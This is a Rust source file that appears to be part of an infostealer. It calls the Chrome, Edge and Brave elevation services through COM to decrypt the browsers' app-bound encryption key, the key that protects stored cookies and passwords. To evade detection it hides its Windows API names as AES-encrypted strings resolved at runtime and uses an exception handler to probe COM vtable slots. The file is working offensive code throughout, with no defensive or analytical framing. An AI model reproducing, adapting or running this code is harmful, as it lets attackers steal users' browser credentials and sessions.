#![allow(non_snake_case, non_camel_case_types, dead_code)]

use std::ffi::c_void;
use std::mem;
use std::os::windows::ffi::OsStrExt;
use std::sync::OnceLock;

use crate::dbg_log;

type FnCoInitializeEx = unsafe extern "system" fn(*const c_void, u32) -> i32;
type FnCoUninitialize = unsafe extern "system" fn();
type FnCoCreateInstance = unsafe extern "system" fn(*const c_void, *const c_void, u32, *const c_void, *mut *mut c_void) -> i32;
type FnCoSetProxyBlanket = unsafe extern "system" fn(*mut c_void, u32, u32, *const u16, u32, u32, *const c_void, u32) -> i32;
type FnSysAllocStringByteLen = unsafe extern "system" fn(*const i8, u32) -> *mut u16;
type FnSysFreeString = unsafe extern "system" fn(*mut u16);
type FnSysStringByteLen = unsafe extern "system" fn(*const u16) -> u32;
type FnDec = unsafe extern "system" fn(*mut c_void, *mut u16, *mut *mut u16, *mut u32) -> i32;

type FnOpenSCManagerW = unsafe extern "system" fn(*const u16, *const u16, u32) -> *mut c_void;
type FnOpenServiceW = unsafe extern "system" fn(*mut c_void, *const u16, u32) -> *mut c_void;
type FnStartServiceW = unsafe extern "system" fn(*mut c_void, u32, *const *const u16) -> i32;
type FnCloseServiceHandle = unsafe extern "system" fn(*mut c_void, u32) -> i32;

struct ComApis {
    co_init: FnCoInitializeEx,
    co_uninit: FnCoUninitialize,
    co_create: FnCoCreateInstance,
    co_proxy: FnCoSetProxyBlanket,
    sys_alloc: FnSysAllocStringByteLen,
    sys_free: FnSysFreeString,
    sys_len: FnSysStringByteLen,
}

struct SvcApis {
    open_scm: FnOpenSCManagerW,
    open_svc: FnOpenServiceW,
    start_svc: FnStartServiceW,
    close_svc: FnCloseServiceHandle,
}

static COM_APIS: OnceLock<Option<ComApis>> = OnceLock::new();
static SVC_APIS: OnceLock<Option<SvcApis>> = OnceLock::new();

const COINIT_MULTITHREADED: u32 = 0x0;
const CLSCTX_LOCAL_SERVER: u32 = 0x4;
const RPC_C_AUTHN_DEFAULT: u32 = 0xFFFF_FFFF;
const RPC_C_AUTHZ_DEFAULT: u32 = 0xFFFF_FFFF;

type FnLoadLibraryA = unsafe extern "system" fn(*const i8) -> *mut u8;
type FnGetProcAddress = unsafe extern "system" fn(*mut u8, *const i8) -> *mut u8;

static RESOLVE_APIS: OnceLock<Option<(FnLoadLibraryA, FnGetProcAddress)>> = OnceLock::new();

use crate::polymorphic_keys::{aes_decrypt, aes_to_cstring};

fn get_resolve_apis() -> Option<(FnLoadLibraryA, FnGetProcAddress)> {
    let opt = RESOLVE_APIS.get_or_init(|| unsafe {
        let k32_name = aes_decrypt(&crate::polymorphic_keys::ELEV_K32_ENC, &crate::polymorphic_keys::ELEV_K32_KEY, &crate::polymorphic_keys::ELEV_K32_NONCE);
        let k32 = inject::syscall::get_module_base(core::str::from_utf8_unchecked(&k32_name))?;
        let ll_name = aes_decrypt(&crate::polymorphic_keys::LOADLIB_ENC, &crate::polymorphic_keys::LOADLIB_KEY, &crate::polymorphic_keys::LOADLIB_NONCE);
        let ll_addr = inject::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&ll_name))?;
        let gp_name = aes_decrypt(&crate::polymorphic_keys::GETPROC_ENC, &crate::polymorphic_keys::GETPROC_KEY, &crate::polymorphic_keys::GETPROC_NONCE);
        let gp_addr = inject::syscall::resolve_export(k32, core::str::from_utf8_unchecked(&gp_name))?;
        Some((mem::transmute_copy(&ll_addr), mem::transmute_copy(&gp_addr)))
    });
    *opt
}

unsafe fn resolve_fn(encoded_dll: &[u8], dll_key: &[u8; 32], dll_nonce: &[u8; 12], encoded_name: &[u8], name_key: &[u8; 32], name_nonce: &[u8; 12]) -> *mut u8 {
    let (ll, gp) = match get_resolve_apis() {
        Some(v) => v,
        None => return std::ptr::null_mut(),
    };
    let c_dll = aes_to_cstring(encoded_dll, dll_key, dll_nonce);
    let c_name = aes_to_cstring(encoded_name, name_key, name_nonce);
    let hmod = ll(c_dll.as_ptr());
    if hmod.is_null() { return std::ptr::null_mut(); }
    gp(hmod, c_name.as_ptr())
}

fn init_com() -> Option<&'static ComApis> {
    let opt = COM_APIS.get_or_init(|| unsafe {
        let ci = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COINIT_ENC, &crate::polymorphic_keys::COINIT_KEY, &crate::polymorphic_keys::COINIT_NONCE);
        let cu = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COUNINIT_ENC, &crate::polymorphic_keys::COUNINIT_KEY, &crate::polymorphic_keys::COUNINIT_NONCE);
        let cc = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COCREATE_ENC, &crate::polymorphic_keys::COCREATE_KEY, &crate::polymorphic_keys::COCREATE_NONCE);
        let cp = resolve_fn(&crate::polymorphic_keys::OLE32_ENC, &crate::polymorphic_keys::OLE32_KEY, &crate::polymorphic_keys::OLE32_NONCE, &crate::polymorphic_keys::COPROXY_ENC, &crate::polymorphic_keys::COPROXY_KEY, &crate::polymorphic_keys::COPROXY_NONCE);
        let sa = resolve_fn(&crate::polymorphic_keys::OLEAUT32_ENC, &crate::polymorphic_keys::OLEAUT32_KEY, &crate::polymorphic_keys::OLEAUT32_NONCE, &crate::polymorphic_keys::SYSALLOC_ENC, &crate::polymorphic_keys::SYSALLOC_KEY, &crate::polymorphic_keys::SYSALLOC_NONCE);
        let sf = resolve_fn(&crate::polymorphic_keys::OLEAUT32_ENC, &crate::polymorphic_keys::OLEAUT32_KEY, &crate::polymorphic_keys::OLEAUT32_NONCE, &crate::polymorphic_keys::SYSFREE_ENC, &crate::polymorphic_keys::SYSFREE_KEY, &crate::polymorphic_keys::SYSFREE_NONCE);
        let sl = resolve_fn(&crate::polymorphic_keys::OLEAUT32_ENC, &crate::polymorphic_keys::OLEAUT32_KEY, &crate::polymorphic_keys::OLEAUT32_NONCE, &crate::polymorphic_keys::SYSLEN_ENC, &crate::polymorphic_keys::SYSLEN_KEY, &crate::polymorphic_keys::SYSLEN_NONCE);
        dbg_log!("elev: resolve ci={:?} cu={:?} cc={:?} cp={:?} sa={:?} sf={:?} sl={:?}", ci, cu, cc, cp, sa, sf, sl);
        if ci.is_null() || cu.is_null() || cc.is_null() || cp.is_null() || sa.is_null() || sf.is_null() || sl.is_null() {
            dbg_log!("elev: some COM APIs null");
            return None;
        }
        Some(ComApis {
            co_init: mem::transmute_copy(&ci),
            co_uninit: mem::transmute_copy(&cu),
            co_create: mem::transmute_copy(&cc),
            co_proxy: mem::transmute_copy(&cp),
            sys_alloc: mem::transmute_copy(&sa),
            sys_free: mem::transmute_copy(&sf),
            sys_len: mem::transmute_copy(&sl),
        })
    });
    opt.as_ref()
}

fn init_svc() -> Option<&'static SvcApis> {
    let opt = SVC_APIS.get_or_init(|| unsafe {
        let os = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::OPENSCM_ENC, &crate::polymorphic_keys::OPENSCM_KEY, &crate::polymorphic_keys::OPENSCM_NONCE);
        let oh = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::OPENSVC_ENC, &crate::polymorphic_keys::OPENSVC_KEY, &crate::polymorphic_keys::OPENSVC_NONCE);
        let ss = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::STARTSVC_ENC, &crate::polymorphic_keys::STARTSVC_KEY, &crate::polymorphic_keys::STARTSVC_NONCE);
        let cs = resolve_fn(&crate::polymorphic_keys::ADVAPI32_ENC, &crate::polymorphic_keys::ADVAPI32_KEY, &crate::polymorphic_keys::ADVAPI32_NONCE, &crate::polymorphic_keys::CLOSESVC_ENC, &crate::polymorphic_keys::CLOSESVC_KEY, &crate::polymorphic_keys::CLOSESVC_NONCE);
        if os.is_null() || oh.is_null() || ss.is_null() || cs.is_null() {
            return None;
        }
        Some(SvcApis {
            open_scm: mem::transmute_copy(&os),
            open_svc: mem::transmute_copy(&oh),
            start_svc: mem::transmute_copy(&ss),
            close_svc: mem::transmute_copy(&cs),
        })
    });
    opt.as_ref()
}

fn start_service(name: &str) {
    let svc = match init_svc() {
        Some(s) => s,
        None => { dbg_log!("elev: svc APIs not available"); return; }
    };
    unsafe {
        let scm = (svc.open_scm)(std::ptr::null(), std::ptr::null(), 0x0001);
        if scm.is_null() { dbg_log!("elev: OpenSCManager failed"); return; }
        let wide: Vec<u16> = std::ffi::OsStr::new(name).encode_wide().chain(Some(0)).collect();
        let h = (svc.open_svc)(scm, wide.as_ptr(), 0x0010);
        if h.is_null() {
            dbg_log!("elev: OpenService '{}' not found", name);
            (svc.close_svc)(scm, 0);
            return;
        }
        let r = (svc.start_svc)(h, 0, std::ptr::null());
        if r == 0 {
            let err = std::io::Error::last_os_error();
            dbg_log!("elev: StartService '{}' err: {}", name, err);
        } else {
            dbg_log!("elev: StartService '{}' OK", name);
        }
        (svc.close_svc)(h, 0);
        (svc.close_svc)(scm, 0);
    }
}

struct Bstr(*mut u16);
impl Bstr {
    unsafe fn new(data: &[u8]) -> Option<Self> {
        let api = init_com()?;
        let p = (api.sys_alloc)(data.as_ptr() as *const i8, data.len() as u32);
        if p.is_null() { None } else { Some(Bstr(p)) }
    }
    fn ptr(&self) -> *mut u16 { self.0 }
}
impl Drop for Bstr {
    fn drop(&mut self) {
        if !self.0.is_null() {
            unsafe { if let Some(a) = init_com() { (a.sys_free)(self.0); } };
            self.0 = std::ptr::null_mut();
        }
    }
}

static mut SLOT_CRASHED: bool = false;

type FnAddVEH = unsafe extern "system" fn(u32, *mut c_void) -> *mut c_void;
static VEH_FN: OnceLock<Option<FnAddVEH>> = OnceLock::new();

#[repr(C)]
struct EXCEPTION_RECORD {
    exception_code: u32,
    exception_flags: u32,
    exception_record: *mut EXCEPTION_RECORD,
    exception_address: *mut c_void,
    number_parameters: u32,
    _reserved: u32,
    exception_information: [usize; 15],
}

#[repr(C)]
struct EXCEPTION_POINTERS {
    exception_record: *mut EXCEPTION_RECORD,
    context_record: *mut c_void,
}

unsafe extern "system" fn veh_handler(exception_info: *mut EXCEPTION_POINTERS) -> i32 {
    if !exception_info.is_null() {
        let code = (*(*exception_info).exception_record).exception_code;
        if code == 0xC0000005 {
            SLOT_CRASHED = true;
            return -1;
        }
    }
    0
}

fn install_veh() {
    VEH_FN.get_or_init(|| unsafe {
        let (ll, gp) = get_resolve_apis().unwrap();
        let c = aes_to_cstring(&crate::polymorphic_keys::ELEV_K32_ENC, &crate::polymorphic_keys::ELEV_K32_KEY, &crate::polymorphic_keys::ELEV_K32_NONCE);
        let h = ll(c.as_ptr());
        let c2 = aes_to_cstring(&crate::polymorphic_keys::ADDVEH_ENC, &crate::polymorphic_keys::ADDVEH_KEY, &crate::polymorphic_keys::ADDVEH_NONCE);
        let addr = gp(h, c2.as_ptr());
        if addr.is_null() { return None; }
        mem::transmute_copy(&addr)
    });
    unsafe {
        if let Some(Some(f)) = VEH_FN.get() {
            f(1, veh_handler as *mut c_void);
        }
    }
}

unsafe fn try_slots(punk: *mut c_void, enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
    let api = init_com().ok_or("no com")?;
    let vtbl = *(punk as *const *const c_void);
    dbg_log!("elev: vtbl={:?}", vtbl);

    for &slot in slots {
        let slot_ptr = (vtbl as *const *const c_void).add(slot);
        let fn_ptr = *(slot_ptr);
        dbg_log!("elev: slot {} fn={:?}", slot, fn_ptr);
        if fn_ptr.is_null() { dbg_log!("elev: slot {} null", slot); continue; }
        let dec: FnDec = mem::transmute_copy(&fn_ptr);

        let cipher = match Bstr::new(enc) {
            Some(c) => c,
            None => { dbg_log!("elev: slot {} bstr fail", slot); continue; }
        };
        let mut plain: *mut u16 = std::ptr::null_mut();
        let mut err: u32 = 0;
        SLOT_CRASHED = false;
        let hr = dec(punk, cipher.ptr(), &mut plain, &mut err);
        if SLOT_CRASHED {
            dbg_log!("elev: slot {} ACCESS VIOLATION", slot);
            continue;
        }
        if hr < 0 || plain.is_null() {
            dbg_log!("elev: slot {} failed hr=0x{:08X} err={}", slot, hr as u32, err);
            continue;
        }
        let len = (api.sys_len)(plain) as usize;
        let data = std::slice::from_raw_parts(plain as *const u8, len).to_vec();
        (api.sys_free)(plain);
        dbg_log!("elev: slot {} got {} bytes", slot, data.len());
        if data.len() == 32 { return Ok(data); }
        if data.len() > 32 {
            let tail = &data[data.len()-32..];
            if tail.iter().any(|&b| b != 0) {
                dbg_log!("elev: slot {} KEY (tail)", slot);
                return Ok(tail.to_vec());
            }
        }
    }
    Err("no slot worked".into())
}

unsafe fn try_one(clsid: &[u8], iid: &[u8], enc: &[u8], slots: &[usize]) -> Result<Vec<u8>, String> {
    let api = init_com().ok_or("no com")?;
    let hr = (api.co_init)(std::ptr::null(), COINIT_MULTITHREADED);
    dbg_log!("elev: CoInit hr=0x{:08X}", hr as u32);

    let mut punk: *mut c_void = std::ptr::null_mut();
    let hr = (api.co_create)(clsid.as_ptr() as *const c_void, std::ptr::null(), CLSCTX_LOCAL_SERVER, iid.as_ptr() as *const c_void, &mut punk);
    dbg_log!("elev: CoCreate hr=0x{:08X} punk={:?}", hr as u32, punk.is_null());
    if hr < 0 || punk.is_null() {
        (api.co_uninit)();
        return Err(format!("CoCreate 0x{:08X}", hr as u32));
    }

    let _ = (api.co_proxy)(punk, RPC_C_AUTHN_DEFAULT, RPC_C_AUTHZ_DEFAULT, std::ptr::null(), 6, 3, std::ptr::null(), 0x40);

    let result = try_slots(punk, enc, slots);

    let vtbl = *(punk as *const *const c_void);
    let rel: unsafe extern "system" fn(*mut c_void) -> u32 = mem::transmute_copy(&(*(vtbl as *const *const c_void).add(2)));
    rel(punk);
    (api.co_uninit)();
    result
}

struct BrowserEntry {
    name: &'static str,
    clsid_hex: &'static str,
    iids_hex: &'static [&'static str],
    slots: &'static [usize],
    service: &'static str,
}

static BROWSERS: &[BrowserEntry] = &[
    BrowserEntry { name: "Chrome", clsid_hex: "708860E0-F641-4611-8895-7D867DD3675B", iids_hex: &["1BF5208B-295F-4992-B5F4-3A9BB6494838", "463ABECF-410D-407F-8AF5-0DF35A005CC8"], slots: &[5, 6, 7, 8], service: "GoogleChromeElevationService" },
    BrowserEntry { name: "Edge", clsid_hex: "1FCBE96C-1697-43AF-9140-2897C7C69767", iids_hex: &["8F7B6792-784D-4047-845D-1782EFBEF205", "C9C2B807-7731-4F34-81B7-44FF7779522B"], slots: &[5, 6, 7, 8], service: "MicrosoftEdgeElevationService" },
    BrowserEntry { name: "Brave", clsid_hex: "576B31AF-6369-4B6B-8560-E4B203A97A8B", iids_hex: &["F396861E-0C8E-4C71-8256-2FAE6D759C9E"], slots: &[5, 6, 7, 8], service: "BraveElevationService" },
];

fn hex_to_guid_bytes(hex: &str) -> Vec<u8> {
    let clean = hex.trim_start_matches('{').trim_end_matches('}');
    let parts: Vec<&str> = clean.split('-').collect();
    if parts.len() != 5 { return Vec::new(); }
    let mut result = Vec::with_capacity(16);

    result.extend(parts[0].as_bytes().chunks(2).rev().map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or("00"), 16).unwrap_or(0)));
    result.extend(parts[1].as_bytes().chunks(2).rev().map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or("00"), 16).unwrap_or(0)));
    result.extend(parts[2].as_bytes().chunks(2).rev().map(|c| u8::from_str_radix(std::str::from_utf8(c).unwrap_or("00"), 16).unwrap_or(0)));
    let p3 = parts[3].as_bytes();
    let p4 = parts[4].as_bytes();
    for i in (0..4).step_by(2) {
        result.push(u8::from_str_radix(std::str::from_utf8(&p3[i..i+2]).unwrap_or("00"), 16).unwrap_or(0));
    }
    for i in (0..12).step_by(2) {
        result.push(u8::from_str_radix(std::str::from_utf8(&p4[i..i+2]).unwrap_or("00"), 16).unwrap_or(0));
    }
    result
}

pub fn try_decrypt_app_bound_key(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    dbg_log!("elev: START ({} bytes)", encrypted_key.len());

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        try_decrypt_inner(encrypted_key)
    }));

    match result {
        Ok(r) => r,
        Err(_) => {
            dbg_log!("elev: PANIC caught");
            None
        }
    }
}

fn try_decrypt_inner(encrypted_key: &[u8]) -> Option<Vec<u8>> {
    if init_com().is_none() {
        dbg_log!("elev: COM init failed");
        return None;
    }
    dbg_log!("elev: COM APIs resolved OK");

    install_veh();

    for b in BROWSERS {
        start_service(b.service);
        std::thread::sleep(std::time::Duration::from_millis(400));

        let clsid = hex_to_guid_bytes(b.clsid_hex);
        if clsid.len() != 16 { dbg_log!("elev: bad clsid for {}", b.name); continue; }

        for iid_hex in b.iids_hex {
            let iid = hex_to_guid_bytes(iid_hex);
            if iid.len() != 16 { continue; }
            dbg_log!("elev: trying '{}' IID={}...", b.name, iid_hex);
            match unsafe { try_one(&clsid, &iid, encrypted_key, b.slots) } {
                Ok(key) => {
                    if key.len() == 32 {
                        dbg_log!("elev: '{}' OK (32 bytes)", b.name);
                        return Some(key);
                    }
                }
                Err(e) => { dbg_log!("elev: '{}' {}", b.name, e); }
            }
        }
    }

    dbg_log!("elev: all failed");
    None
}
